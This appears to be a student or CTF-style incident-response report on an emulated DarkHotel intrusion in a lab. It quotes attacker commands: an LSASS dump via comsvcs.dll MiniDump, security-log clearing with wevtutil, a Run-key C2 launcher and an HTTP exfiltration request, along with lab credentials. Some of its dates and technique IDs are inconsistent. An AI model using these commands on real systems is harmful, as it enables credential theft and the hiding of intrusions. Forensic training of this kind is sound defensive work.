# APT-C-06-Dark-Hotel-emulation-detection-report
## Introduction 

## Executive Summury
On 22/08/2026, the workstation host DESKTOP-2A1O8LD was the target of a cyberattack, which began at 10:18:31 UTC. The attacker tricked the host owner into running a fake ‘HotelWifi Portal Update’ software, which appeared trustworthy because it carried a legitimate looking digital approval to bypass security controls. Once executed, the malicious program stole credentials from memory, establishing long-term access, gathered and collected sensitive data to transfer to an unauthorized destination. Immediately block the attacker’s 192.168.67.128 at the firewall and  contain the compromised machine to prevent further spread across the network
#### Severity assessment: critical 
#### Affected assets 
-	Hostname: DESKTOP-2A1O8LD 
-	 IP address:192.168.67.140
-	MAC address:00:0c:29:e5:73:d4  
-	Operating system: 64-bit Windows 10 (22H2), build 19045
-	Hardware: 12th Gen Intel(R) Core(TM) i7-12700H
-	Asset type: Workstation 
-	Compromised accounts: 
legacy account(name:svc_test_legacy,password:Winter2023!)

## Part1 - Threat Actor Context
| **Category** | **Details** |
|---|---|
| **APT-C-06** | DarkHotel |
| **Threat Actor** | DarkHotel |
| **Delivery Method** | Wi-Fi login page |
| **Targeted Sectors** | - Luxury business hotel networks (scenario case)<br>- Defense Industrial Base (DIB)<br>- Governments<br>- Non-governmental organizations (NGOs)<br>- Large electronics and peripherals manufacturers<br>- Pharmaceutical companies and medical providers<br>- Military-related organizations<br>- Energy policymakers |
| **Attacker's Actions** | The attacker did not rely on conventional malware but performed actions that caused significant impact:<br>- Dumping credentials from LSASS memory using `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 696 C:\NulltackLab\lsass.dmp full`<br>- Clearing the Security event log using `wevtutil cl Security` |
| **Known Campaigns** | - **2014** – Hotel Wi-Fi Campaign – Asia<br>- **2017** – Defense Industry Intrusions – Japan and South Korea<br>- **2025** – Cloud Exploitation Campaign – East Asia |
| **Motivation** | - Strategic Intelligence Gathering<br>- Corporate Espionage<br>- Regional Monitoring |

## Part2 - System profiling
| **Evidence** | **Value** | **Evidence** |
|---|---|---|
| **Computer name** | `DESKTOP-2A1O8LD` | SYSTEM Hive |
| **Timezone** | Ekaterinburg Standard Time<br><br>(UTC + 5) | SYSTEM Hive |
| **Users** | **administrator [RID :500]**<br><br>Created: Fri Nov 14 01:37:07 2026 UTC<br><br>Last login : never<br><br>Login count : 0<br><br>**anmar [RID :1001]**<br><br>Created: Fri Nov 14 02:00:20 2026 UTC<br><br>Last login : Sun Aug 23 22:29:01 2026 Z<br><br>Login count : 329<br><br>**svc_test_legacy [RID :1007]**<br><br>Created: Sat Aug 8 22:32:30 2026 UTC<br><br>Last login : Sat Aug 22 05:27:17 2026 UTC<br><br>Login count : 0 | SAM Hive |
| **Shimcache** | Located in `SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache`.<br><br>Confirmed the presence of `HotelWiFi_Portal_Update.exe` in `C:\Users\anmar\Downloads\` directory at **2026-08-22 10:18:32 UTC** | SYSTEM Hive |

Analysis of SAM registry hive revealed three user accounts: administrator, anmar and svc_test_legacy created  on DESKTOP-2A1O8LD host:<br>
Administrator and anmar created on 14 November 2026.Anmar account shows a last login 23/08/2026 at 02:00:20 UTC .This suggests that anmar is the primary user of the DESKTOP-2A1O8LD host.<br>
Svc_test_legacy was created on 08/08/2026 with last login recorded on 22/08/2006 at 05:27:17 UTC and a login count of zero. Account description (“legacy-test-command do not use in production”) suggests that is a legacy account with remote access capability. The login count of  zero combined with las login timestamps indicate that the account has never been used to log in locally; instead reflects authentication via remote methods. 
## Part3 - Initial access 
### 1.Sysmon artifact
Sysmon events filtered on EventID1 (process create), with Image field containing Downloads, revealed the execution of HotelWiFi_Portal_Update.exe from the C:\Users\anmar\Downloads\ directory. The process was launched by explorer.exe as the parent process under the DESKTOP-2A108LD\anmar account at 10:18:32 UTC.<br>
The hash “DERIVED FROM hostname.exe clone” indicates that the file was created as a clone of  another file.
<img width="945" height="270" alt="image" src="https://github.com/user-attachments/assets/99614013-6fcb-4802-a02f-433f81087983" /></br>
### 2.Further investigation of execution artifacts
##### Prefetch: 
the prefetch file was unavailable for direct analysis<br>
#### Amcache hive and userassist
(Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist) did not contain evidence of HotelWiFi_Portal_Update.exe presence.<br>
#### Shimcache: 
located in SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache confirmed the presence of HotelWiFi_Portal_Update.exe in C:\Users\anmar\Downloads\ directory at 2026-08-22 10:18:32 UTC <br>
<img width="945" height="462" alt="image" src="https://github.com/user-attachments/assets/97749fa1-73db-4e28-af08-d3f6bdca6e5a" /><br>
### 3.Network traffic correlation
Although prefetch file was unavailable for analysis, network traffic analysis of in stream 545 captured a WinRM-based command used to remotely query prefetech_tight.csv for prefetch artifact information.<br>
The returned output provided evidence indicating that HotelWiFi_Portal_Update.exe was executed  once on 2026-08-22 10:18:32 UTC. The stream referenced the corresponding prefetch: C:\\Windows\\Prefetch\\HOTELWIFI_PORTAL_UPDATE.EXE-E2A57322.pf<br>
<img width="945" height="468" alt="image" src="https://github.com/user-attachments/assets/f39cba6d-a9a3-43f1-8d8a-d60fadd5dc57" /></br>
### 4.Alternate Data Stream: Zone.Identifier
Zone.Identifier often seen as Alternate Data Stream (ADS) attached to file downloaded files on Windows, was introduced with Windows XP Service Pack 2 and Windows Server 2003 Service Pack 1. These updates added a new security mechanism known as Mark Of The Web (MOTW), designed to protect users from running unsafe files obtained from the internet.<br>
When a file is downloaded using internet explorer or another application, windows appends and ADS named Zone.Identifier, such as HotelWiFi_Portal_Update.exe:Zone.Identifier. This hidden stream contains metadata about the file’s origine, such as its security zone:
•	ZoneId=3 assigned to files from the internet 
•	ZoneId=2: assigned to trusted sites
•	ZoneId=1:  assigned to file from intranet 
•	ZoneId=0 : file from a local machine <br>
C:\Users\anmar\AppData was unavailable for analysis, which prevented determining the ZoneId of malicious executable.
### 5.MFT Zone:Identifier artifact
Analysis of the MFT file, filtered on entries IsAds=true revealed that the file HotelWiFi_Portal_Update.exe:Zone.Identifier located at C:\Users\anmar\Downloads contains an ADS. <br>
<img width="945" height="179" alt="image" src="https://github.com/user-attachments/assets/9da13b6e-8ddc-4573-b287-4409ee7e6881" /><br>
### 6.Findings
- HotelWiFi_Portal_Update.exe was executed from exe from C:\Users\anmar\Downloads\ directory at 10:18:32 UTC.
- The malicious file HotelWiFi_Portal_Update.exe contains an ADS named Zone.Identifier
## Part 5 - Password spray
### 1.Sysmon artifact
Sysmon events filtered on EventID3 (Network connection)  and DestinationPort 445 revealed 7 event logs indicating that the host 192.168.67.128 established a TCP connection to 192.168.67.140:445 targeting the svc_test_legacy account, on host DESKTOP-2A1O8LD,  from 10:24:36 UTC to 10:27:17 UTC.<br>
This activity confirms the finding in system profiling section, where the svc_test_legacy account showed zero login count with a valid last login timestamp confirming that the account connected remotely not locally.
<img width="945" height="474" alt="image" src="https://github.com/user-attachments/assets/0dc08d04-7b4b-404a-b1a9-3943c5c190d6" /><br>
### 2.Network traffic artifact 
Network traffic filtered on smb2.account == svc_test_legacy confirmed seven logon attempts targeting svc_test_legacy account, with six failed attempts (BONUS A)  and a successful final attempt. This corroborates sysmon EventID 3 artifacts .
<img width="945" height="470" alt="image" src="https://github.com/user-attachments/assets/67be3cdb-2cfb-4422-897d-223a72810701" /><br>
HTTP stream 220 recorded evidence of credential access via password spray, indicating that the 7th attempts succeeded using the password Winter2023! at 10:27:17 UTC.
<img width="945" height="469" alt="image" src="https://github.com/user-attachments/assets/f85af9d5-8811-4c22-85c7-4c50740a3830" /><br>
### 3.Foothold Remote access
Network traffic analysis revealed that the attacker’s server (192.168.67.128) communicates with the target machine (192.168.67.140) over http protocol, on the 192.168.67.140:5985/wsman endpoint, using python WinRM client user agent. This indicates that the attacker leveraged WinRM protocol to access and control the 192.168.67.140 host via port 5985.<br>
<img width="945" height="469" alt="image" src="https://github.com/user-attachments/assets/b8eb5dbc-d528-4be6-96be-154ee3e08ba8" /><br>
### 4.Findings
- The svc_test_legacy account credentials were accessed via password spray, with six failed attempts and successful final attempt using the password Winter2023! at 10:27:42 UTC.
- The attacker connected remotely using WinRM protocol port 5985 to the target machine
## Part 6 - Discovery
### 1.Sysmon artifacts
Sysmon event logs filtered on EventID 1 revealed discovery activity performed on the DESKTOP-2A1O8LD host under the anmar user context, as described in the following table: 
| **Timeline** | **Activity** | **Explanation** |
|---|---|---|
| **10:20:03 UTC** | **Local account discovery** | Sysmon (record 23010) recorded the creation of the `whoami.exe` process spawned by `powershell.exe` using an encoded (Base64) command.<br><br>The decoded command was: `whoami /all \| Select-Object -First 3`<br><br>This indicates an attempt to enumerate current user information. |
| **10:20:58 UTC** | **System discovery** | Sysmon (record 23011) showed the creation of the `systeminfo.exe` process spawned by `powershell.exe` using an obfuscated (Base64) command.<br><br>The decoded command was: `systeminfo \| Select-String 'Host Name','OS Name'`<br><br>This suggests reconnaissance targeting system information, including hostname and OS name. |
| **10:21:38 UTC** | **Running process discovery** | Sysmon (record 23012) captured the creation of the `tasklist.exe` process spawned by `powershell.exe` using a Base64-obfuscated command.<br><br>The decoded command was: `tasklist \| Select-String lsass, sandcat, splunkd`<br><br>This activity indicates attempts to enumerate running processes including:<br><br>- `lsass.exe`: handles user authentication and security policy<br>- `sandcat.exe`: Caldera agent<br>- `splunkd.exe`: SIEM (System Information and Event Management) used for log collection and monitoring (Flag3) |
| **10:22:15 UTC** | **Local administrators group membership discovery** | Sysmon (record 23013) showed the creation of the `net.exe` process spawned by `powershell.exe` using the command line `net localgroup administrators`.<br><br>This activity indicates an attempt to enumerate the local administrator group. |

<img width="945" height="553" alt="image" src="https://github.com/user-attachments/assets/a7290f94-cba7-4250-a61c-46fac6f0a226" /><br>
### 2.Amache artifact
Amache recorded last-write timestamps associated with the corresponding files entries, on 06-08-2026:
- tasklist.exe at 13:29:20 UTC 
- whoami.exe at 13:33:58
- systeminfo at 13:38:57 UTC
- net.exe at 13:39:00 UTC
<img width="945" height="135" alt="image" src="https://github.com/user-attachments/assets/834e2a80-7ea7-4f4f-9877-95d442d2c2d0" /><br>
### 3.Network traffic (Prefetch evidence) artifacts
Prefetch execution evidence captured by network traffic (stream 545) revealed the following execution:<br>
| **Process name** | **Timeline (last run)** | **Run count** | **Source** |
|---|---|---|---|
| **SYSTEMINFO.EXE** | 2026-08-22 10:20:58 UTC | Once | `C:\Windows\Prefetch\SYSTEMINFO.EXE-3EAAF1C2.pf` |
| **TASKLIST.EXE** | 2026-08-22 10:21:38 UTC | Once | `C:\Windows\Prefetch\TASKLIST.EXE-F58BCF08.pf` |
| **WHOAMI.EXE** | 2026-08-22 10:20:03 UTC | Once | `C:\Windows\Prefetch\WHOAMI.EXE-9D378AFE.pf` |
### 4.Findings
- Amache recorded last-write timestamps associated with the corresponding entries(net.exe,whoami.exe,tasklist.exe and systeminfo.exe) on 06-08-2026.
- Sysmon Event ID1 and Prefetch provide proof of execution of the tasklist.exe, whoami.exe and systeminfo.exe processes on 22-08-2026 from 10:20:03 UTC to 10:21:38 UTC, confirming the reconnaissance activity performed on the DESKTOP-2A1O8LD under anmar user context. The discovery involved system information, current user information, running processes. 
## Part 7 - Privilege escalation
### 1.Sysmon artifact
Symon events filtered on EventID 1 recorded the creation of the process net.exe, child of  powershell.exe, on the host DESKTOP-2A1O8LD under anmar user context at 10:27:42 UTC. The process was executed via the command line net localgroup administrators svc_test_legacy /add. This suggests an attempt to add the svc_test_legacy account to the local administrators group membership.
<img width="937" height="315" alt="image" src="https://github.com/user-attachments/assets/f527f683-106b-4c6d-8e9f-f513803e394f" /><br>
### 2.SAM registry hive artifact
Investigation of administrator’s group membership from the SAM registry hive confirmed that svc test legacy was successfully added to the administrator group by the user anmar: 
- S-1-5-21-2053833827-3235952737-1524074619-1001: the SID of anmar user
- S-1-5-21-2053833827-3235952737-1524074619-500: the SID of the administrator
- S-1-5-21-2053833827-3235952737-1524074619-1007: the SID of svc_test_legacy
<img width="945" height="239" alt="image" src="https://github.com/user-attachments/assets/bfdd475c-3a00-4f25-8b99-82c05d5f5062" /><br>
### 3.Findings
The svc_test_legacy account was added to the local administrator group, granting the account elevated privileges. 
## Part 8 — Credential theft
## 1.Symon artifacts
Sysmon events filtered on EventID 10( process access) with TargetImage ending in lsass.exe indicate that the powershell.exe process (PID 3248) accessed lsass.exe process (PID 696: Flag5) with GrantedAccess 0x1410(Flag 4) on host DESKTOP-2A1O8LD at 10:30:03 UTC.<br>
GrantedAccess 0x1410 means:
- PROCESS_VM_READ
- PROCESS_QUERY_INFORMATION
- PROCESS_QUERY_LIMITED_INFORMATION<br>
This indicates that the lsass.exe process memory was read by the powershell process.
<img width="945" height="372" alt="image" src="https://github.com/user-attachments/assets/fceec525-3516-4993-844f-78b650f0ad49" /><br>
Symon EventID1 (process create) revealed the creation of rundll32.exe child of powershell.exe process on host DESKTOP-2A1O8LD at 10:30:03 UTC. The process executed rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 696 C:\NulltackLab\lsass.dmp full commandline, in which rundll32.exe invoked the MiniDump function of comsvcs.dll to dump lsass.exe (PID 696) memory credentials and save the findings on C:\NulltackLab\lsass.dmp.<br>
This indicates the use of LOLBins (Living-Of-The-Land Binaries): rundll32.dll was abused to dump lsass memory, consistent with credentials dumping activity.
<img width="945" height="318" alt="image" src="https://github.com/user-attachments/assets/bbf984cc-7e20-43d7-b5a0-263c28954fc4" /><br>
Network traffic captured in stream 523 contained a WinRM based command used to remotely query a sysmon.csv containing EventID10 located at C:\Users\anmar\Desktop\23-\evidence_out\sysmon.csv\ for sysmon EventID 10 events. <br>
The returned output identified six EventID10 records targeting C:\Windows\system32\lsass.exe between 10:21:38 UTC and 10:42:31 UTC, as described in the following table <br>

| Timeline | SourceProcess | GrantedAccess |
|----------|---------------|---------------|
| **10:21:38 UTC** | `C:\Windows\system32\wbem\wmiprvse.exe` | `0x1410` |
| **10:29:49 UTC** | `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26070.9-0\MsMpEng.exe` | `0x101000` |
| **10:30:03 UTC** | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | `0x1410` |
| **10:41:42 UTC** | `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26070.9-0\MsMpEng.exe` | `0x101000` |
| **10:42:31 UTC** | `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26070.9-0\MsMpEng.exe` | `0x101000` |
| **10:42:31 UTC** | `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26070.9-0\MsMpEng.exe` | `0x1010` |

<img width="945" height="471" alt="image" src="https://github.com/user-attachments/assets/61fdc699-334f-4d14-b61a-34f42df2567d" /><br>
The malicious access originated from the powershell.exe process at 10:30:03 UTC. This conclusion  was obtained by correlating the EventID10 findings with EventID1(rundll32.exe process creation) timestamps, where rundll32.exe(child of powershell.exe process) was abused to access lsass memory and dump credentials.<br>
A sysmon EventID11 (file create) was observed at 10:30:03 UTC, recording the creation of mem_triage.txt file on DESKTOP-2A1O8LD host by user anmar. The file was created by the powershell.exe process in the C:\NulltackLab directory, at roughly the same time as observed memory-dumping activity. This suggests that the file may contain data extracted from memory, staged for exfiltration. However, no network traffic corresponding to mem_triage.txt exfiltration was captured.
<img width="945" height="78" alt="image" src="https://github.com/user-attachments/assets/972b9af7-2121-4fb8-bd48-aecfce739002" /><br>
### 2.Findings 
The lsass process was accessed by the legitimate windows utility rundll32.exe using 0x1410 GrantedAccess, which was abused via comsvcs.dll minidump function to dump credentials from the memory at 10:30:03 UTC. 
## Part 9 - Persistence 
### 1.Persistence via Run key
#### 1.1.Sysmon artifact
Symon events filtered on EventID13 (RegistryEvent, value set) revealed the creation of a persistence mechanism under the registry path HKU\S-1-5-21-2053833827-3235952737-1524074619-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ , in the context of user anmar on DESKTOP-2A1O8LD host, using powershell.exe process at 10:32:34 UTC.<br>
The registry key was created with HotelSyncAgent as the key name and C:\NulltackLab\sandcat.exe -server http://192.168.67.128:8888 -group red as the  value(Flag 6). This indicates that sandcat.exe,  was configured to execute automatically when anmar user logged in, establishing a persistence mechanism through registry run key.
<img width="945" height="306" alt="image" src="https://github.com/user-attachments/assets/7515975d-231d-4a10-8c13-160e65896a34" /><br>
#### 1.2.SOFTAWRE registry hive artifact
Investigation of  SOFTAWRE registry hive confirmed the creation of an autostart run key  named HotelSyncAgent, associated with the value  C:\NulltackLab\sandcat.exe -server http://192.168.67.128:8888 -group red  at 10:32:34 UTC.
<img width="945" height="177" alt="image" src="https://github.com/user-attachments/assets/38b2f614-2b57-4272-9d25-51c26908643c" /><br>
### 2.Persistence via scheduled tasks
#### 2.1.Sysmon artifact
Sysmon events filtered on EventID1 (process create) revealed the creation of a scheduled task using powershell.exe process on the DESKTOP-2A1O8LD host, under anmar user context at 10:32:35 UTC . The task was configured with the name MicrosoftEdgeSyncTask (Flag 7) which mimics legitimate Microsoft Edge task. It was designed to execute sandcat.exe, located in C:\NulltackLab\, when anmar user logged on, with the highest privileges. 
<img width="945" height="322" alt="image" src="https://github.com/user-attachments/assets/e43553d0-dfcc-4a5a-91d7-e7e974163ce7" /><br>
#### 2.2.Registry artifact
The tasks directory normally located in C:\Windows\System32\tasks and containing the MicrosoftEdgeSyncTask was unavailable for analysis.
#### 2.3.Network artifact
Network traffic analysis revealed evidence(Prefetch tight execution evidence - stream 545) of schtasks.exe execution .The traffic capture indicated that schtasks.exe was executed twice, with the last execution recorded at 10:44:45 UTC. The capture also referenced the corresponding prefetch artifact,  C:\\Windows\\Prefetch\\SCHTASKS.EXE-8B6144A9.pf, however the Prefetch file was unavailable for direct analysis
### 3. Persistence mechanism that survives reboot and user profile reset  
The attacker planted two persistence mechanisms: 
•	HotelSyncAgent(registry run key) located in HKU\S-1-5-21-2053833827-3235952737-1524074619-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
•	MicrosoftEdgeSyncTask(scheduled task) located in C:\Windows\System32\tasks
--> Both persistence mechanisms are designed to survive system reboot. 
However, HotelSyncAgent is tied to the specific user SID S-1-5-21-2053833827-3235952737-1524074619-1001, which corresponds to the anmar user. This indicates that if the anmar profile is reset the persistence also will be removed.<br>
In contrast, MicrosoftEdgeSyncTask was created under the system account indicating that the scheduled task is independent of user and would persist even if the user profile’s is reset or the account is deleted.
### 4.Findings
The attacker established two persistence mechanisms via:
- Autostart Run key : named HotelSyncAgent, was created to execute sandcat.exe each time the anmar user logged in. The persistence mechanism was created at 10:32:34 UTC
- Scheduled task: named MicrosoftEdgeSyncTask was created to automatically execute at user login. Its execution was observed at 10:32:35 UTC
## Part10 — Collection, Exfiltration & Evasion :
### 1.Collection and Exfiltration
#### 1.1.Sysmon artifact
Sysmon EventID 11 (file create) recorded the creation of files within the C:\NulltackLab\staging directory by powershell.exe process on the DESKTOP-2A1O8LD host, under anmar user context at 10:35:05 UTC. The files created were:
- Executive_Travel_Itinerary.docx
- Q3_MnA_Confidential.xlsx
- VPN_Access.txt<br>
This presence of files within the staging directory suggests that sensitive data was collected and staged by the attacker for exfiltration.<br>
USN journal was unavailable for analysis preventing confirmation of file creation via additional forensic sources.<br>
The collection activity was immediately followed by the creation of the exfil_bluebalance.zip file (Flag 8), one second later,  at 10:35:06 UTC. This archive indicates that the collected and staged files were compressed and prepared for exfiltration.<br>
<img width="945" height="476" alt="image" src="https://github.com/user-attachments/assets/12bda9dd-d3b2-48d9-8352-a66260bf85c6" /><br>
#### 1.2.Network traffic artifact
Wireshark filtered on http.request.uri.query contains"exfil_bluebalance.zip" revealed a Get query from 192.168.67.140 (the compromised machine),  requesting a file named exfil_bluebalance.zip with size 559 bytes, from the HTTP server at 192.168.67.128:9999 using the user agent Windows NT 10.0;WindowsPowerShell/5.1.19041.6456 (HTTP request generated from Windows 10 via powershell 5.01)10:37:07 UTC. However, the server’s (SimpleHTTP/0.6 ) response does not provide evidence that the file was received.
<img width="945" height="432" alt="image" src="https://github.com/user-attachments/assets/8b05d251-237f-4140-b76c-98b76c9f0e78" /><br>
This activity confirmed by sysmon EventID3, where a TCP connection was established from the compromised host 192.168.67.140 to the destination host 192.168.67.128 on port 9999, on the host DESKTOP-2A1O8LD at 10:37:07 UTC. The connection was generated via the powershell.exe process with GET /?f=exfil_bluebalance.zip&sz=559 as the HTTP request and a total of 559 bytes sent.
<img width="945" height="524" alt="image" src="https://github.com/user-attachments/assets/f8be70e0-5f0b-49d1-bd8e-4d239db1f76c" /><br>
#### 1.3.Findings
- Sensitive files identified as: Executive_Travel_Itinerary.docx,Q3_MnA_Confidential.xlsx, VPN_Access.txt, were collected and staged in C:\NulltackLab\staging at 10:35:05 UTC.
- The staged files were archived into exfil_bluebalance.zip at 10:35:06 UTC.
- An exfiltration attempt of the archive(exfil_bluebalance.zip, 559 bytes in size) to an unauthorized destination, 192.168.67.128:9999,  via the HTTP protocol, was observed.
### 2.Evasion
#### 2.1.Security log clearing artifact
Sysmon eventID1 revealed the creation of wevtutil.exe process by the powershell.exe process on DESKTOP-2A108LD host at 10:40:04 UTC, under anmar user context. The wevtutil.exe process executed the command wevtutil cl Security, indicating that the security log was cleared to hinder investigation.
<img width="936" height="261" alt="image" src="https://github.com/user-attachments/assets/3be698a7-1bf6-4a76-9294-f7948fb76df2" /><br>
Prefetch (execution evidence), requested via WinRM based command on stream 545, revealed the execution of wevtutil.exe 25 times, with the last run at 10:40:04 UTC, referenced as Src=C:\\Windows\\Prefetch\\WEVTUTIL.EXE-1E154F39.pf.<br>
This confirms the security log clearing and indicates that the attacker attempted to hide their traces and make investigation harder.
#### 2.2.Timestomps artifact
Analysis of MFT filtered on $STANDARD_INFORMATION and $FILENAME revealed:
- A mismatch exists between $STANDARD_INFORMATION and $FILE_NAME; $SI shows 2009 however $FN shows 2026
- MFT $FILE_NAME records indicate creation in 2026, while $SI reflects 2009.This mismatch is consistent with a timestomping activity (Flag BONUS B),in which the attacker may modify the $SI timestamps to make the dropper appear as it has existed for a long time.
<img width="945" height="148" alt="image" src="https://github.com/user-attachments/assets/622968d5-aca5-4743-85f8-a021c5346d78" /><br>
### 2.3.file deletion artifacts 
Sysmon EventID23 (File delete) revealed the suppression of collected files from the compromised machine, through the powershell.exe process, by anmar user at 10:39:46 UTC. The deleted files involved:
- Executive_Travel_Itinerary.docx
- Q3_MnA_Confidential.xlsx
- VPN_Access.txt
<img width="940" height="707" alt="image" src="https://github.com/user-attachments/assets/b9724f20-4b7b-433b-b295-7e427177aae4" /><br>
MFT analysis provides no entries for the collection files.<br>
Prefetch (evidence execution), queried via WinRM based command (stream 545) showed the executio of the sdelete64.exe program once at 10:39:46 UTC, the same time as the files deletion, referrenced as Src=C:\\Windows\\Prefetch\\SDELETE64.EXE-0A28E779.pf. <br>
Amcahe, filtered on sdelete64.exe, revealed that the OriginalFileName is cipher.exe, with last-writetimestamps of 22-08-2026 at 22:32:22 UTC, indicating that sdelete64.exe was masquerading as cipher.exe and located at C:\NulltackLab directory .<br>
Cipher.exe is built-in commandline tool in windows operating system used to encrypt or decrypt data on NFTS drive. It also lets users securely delete data by overwriting it. This confirms the deletion of the collected files and explains their absence from MFT records.
<img width="945" height="159" alt="image" src="https://github.com/user-attachments/assets/f1f66542-051f-4372-9e79-86fff36a1685" /><br>
### 3.Findings:
- Windows security log was deleted using wevtutil.exe at 10:40:04 UTC
- Timestomp activity affected HotelWifi_Portal_Update.exe, revealing a $STANDARD_INFORMATION timestamps of  13-07-2009 inconsistent with the actual file’s creation
- The collected files were deleted using sdelete64.exe,masquerading as the legitimate windows command cipher.exe, which securely overwrites the disk space previously occupied by the deleted files. This hinders investigation and prevents recovery of the deleted files.
## Part11 — Command and Control 
Network traffic analysis revealed a C2 beaconing session from 09:56:51 UTC to 11:36:36 UTC(roughly 1 hour and 40 minutes). The beacon originated from the compromised host 192.168.67.140, where the caldera agent sandcat.exe, located in C:\NulltackLab directory, was installed, to the C2 caldera server at 192.168.67.128:8888/beacon endpoint(Flag 10). The observed beacons ranged from 30 - 60 seconds.<br>
The C2 was established via the persistence mechanism, a registry Run key(investigated in persistence mechanism section captured via sysmon EventID3 record 23019), named HotelSyncAgent which executes C:\NulltackLab\sandcat.exe -server http://192.168.67.128:8888 -group red (Flag 10) at every login.
## Part12 — NIST framework
### 1.Incident NIST 800-53 control failure 
| Incident Phase | NIST 800-53 Control Failure | Reason |
|----------------|-----------------------------|--------|
| Initial access | SI-3 Malicious code protection<br>AT-3 Role-based training | Misconfigured |
| Password spraying | IA-2 Identification and authentication<br>AC-7 Account lockout | Misconfigured<br>Absent |
| Credential theft | AC-6 Least privilege | Absent |
| Persistence | CM-3 Configuration change management | Absent |
| Collection | AC-3 Access enforcement | Absent |
| Exfiltration | AC-4 Information flow enforcement | Absent |
| Evasion | SI-7 Software, Firmware and Information integrity<br>AU-9 Protection of Audit information | Absent<br>Absent |
### 2.NIST CSF 2.0 functions assessment
| Function | Rate |
|----------|------|
| Identify | PASS |
| Protect | PASS |
| Detect | Partial: persistent malicious code and signature-based trust bypassing detection at execution, allowing "HotelWifi Portal Update.exe" to run unflagged. However, Sysmon successfully detected and flagged LSASS access, discovery, persistence, collection, staging, exfiltration and evasion activities. |
| Respond | Not evaluated |
| Recover | |
### BONUS C
SI-3 Malicious Code Protection: is the NIST control whose presence would have stopped the intrusion at the front of the door. The control failed because a malicious code sat dormant for a period without detection, waiting for the executive to connect. Once the executive connected, it triggered a fake Wi-Fi update that itself bypassed detection via a valid signature.
## Part 13: Lesson learned:
The real lesson of Darkhotel is that digital signature does not guarantee that binary is benign, attackers exploit trust not just technology. Based on this scenario, SOC analysts should understand that digital signature is not proof of safety. Analysts should treat signed binaries with the same scrutiny as malicious ones, correlating certificate metadata with behavioral indicators.
## Part 14 — Defense improvement: Splunk detection rules 
### 1.Detect credentials theft 
<img width="945" height="431" alt="image" src="https://github.com/user-attachments/assets/d056758e-332b-41ed-a1fc-2a36108a5903" /><br>
### 2.Kill-chain detection: File execution-Credential access-persistence (Bonus C2)
<img width="945" height="475" alt="image" src="https://github.com/user-attachments/assets/b7ec35ae-6413-4310-bc50-9bd2a6fd914d" /></br>
### Part 15 - Timeline, MITRE ATT&CK mapping and supporting evidence 

| Timeline | Action | Tactic | Technique | Evidence |
|----------|--------|--------|-----------|----------|
| 09:56:51 UTC – 11:36:36 UTC | C2 beaconing | Command and control | T1071.001 - Application Layer Protocol: Web Protocol | Pcap (stream3)<br>EventID13 |
| 10:18:32 UTC | HotelWiFi_Portal_Update.exe masquerading Wi-Fi portal update was executed | Execution | T1204.002 – User execution: malicious file | EventID1(record 23002), appcompatcache, pcap |
| 10:20:03 UTC | Current user enumeration using whoami.exe process | Discovery | T1033 – System Owner/User Discovery | Event ID1(record 23010 – 23013) ,pcap(stream 545 prefetch record) |
| 10:20:58 UTC | System information enumeration using systeminfo.exe | | T1082 – System Information Discovery | |
| 10:21:38 UTC | Process discovery using tasklist.exe process | | T1057 – Process discovery | |
| 10:22:15 UTC | Local group administrators’ enumeration attempt using net localgroup | | T1069.001 – Permission Groups Discovery : Local Groups | |
| 10:27:17 UTC | Svc_test_legacy account was compromised via password spraying | Credential access | T1110.003 – Brute Force PasswordSpraying | EventID3(EventRecords 23003-23011)<br>Pcap file |
| | | Initial access | T1078 – ValidAccounts | |
| 10:27:42 UTC | The svc_test_legacy account was added to the administrator group | Privilege escalation | T1098.007 – Account Manipulation:Additional Local or Domain Groups | EventID1 (record 23014), SAM hive |
| 10:30:03 UTC | Lsass process was accessed by rundll32.exe via comsvcs.dll minidump function | Credential access | T1003.001 – OS Credential Dumping: LSASS Memory | EventID10(record 23017),EventID1(record 23016) |
| 10:32:34 UTC | Autostart run key (HotelSyncAgent )was created | Persistence | T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | EventID13(record 23019),SOFTWARE registry hive |
| 10:32:35 UTC | Scheduled task (MicrosoftEdgeSyncTask) was created | | T1053.005 – Scheduled Task/Job: Scheduled Task | EventID1(record 23020),pcap |
| 10:35:05 UTC | Collected data was staged on staging directory | Collection | T1074.001 – Data Staged: Local Data Staging | EventID11(record 23022 – 23024) |
| 10:35:06 UTC | Collected data was compressed prior to exfiltration | Collection | T1560 – Archive Collected Data | EventID 11 (record 23025), pcap |
| 10:37:07 UTC | An exfiltration attempt to an unauthorized destination over port 9999 | Exfiltration | T1048 – Exfiltration Over Alternative Protocol | EventID3( record 23026), pcap |
| 10:39:46 UTC | Staged files were deleted by sdelete64.exe | Defense impairment | T1070.004 – Indicator removal : file deletion | EventID23(record 23030-23032),Prefetch,amcahe |
| 10:40:04 UTC | The attacker windows security log via wevtutil.exe utility | | T1685 – Disable or Modify Tools: clear windows Event logs | EventID1(record 23032), prefetch |
| | Attacker modifies dropper timestamps to make it appear to have existed much earlier | stealth | T1070.006 – Indicator Removal : Timestomp | pcap file (stream 534) |
| | Cipher.exe masquerading as sdelete64.exe | | T1036.003 – Masquerading: Rename Legitimate Utilities | Amcache |

## Part 16 - IOCs:
| Category | Details |
|----------|---------|
| IPS | `192.168.67.140`: compromised machine<br>`192.168.67.128`: attacker server (C2 caldera server)<br>`192.168.67.1`: Controller server |
| URLs | `http://192.168.67.128:9999/?f=exfil_bluebalance.zip&sz=559`<br>`http://192.168.67.128:5000/api/command`<br>`http://192.168.67.128:8888 /beacon`<br>`http://192.168.67.128:5958 /wsman` |
| Ports | 9999: on which the HTTP server was listening |
| User agent | WindowsPowerShell/5.1.19041.6456 was |
| Compromised accounts | svc_test_legacy account<br>- username=svc_test_legacy<br>- Password=Winter2023!<br><br>Administrator's session<br>- Username=anmar<br>- Password=admin |
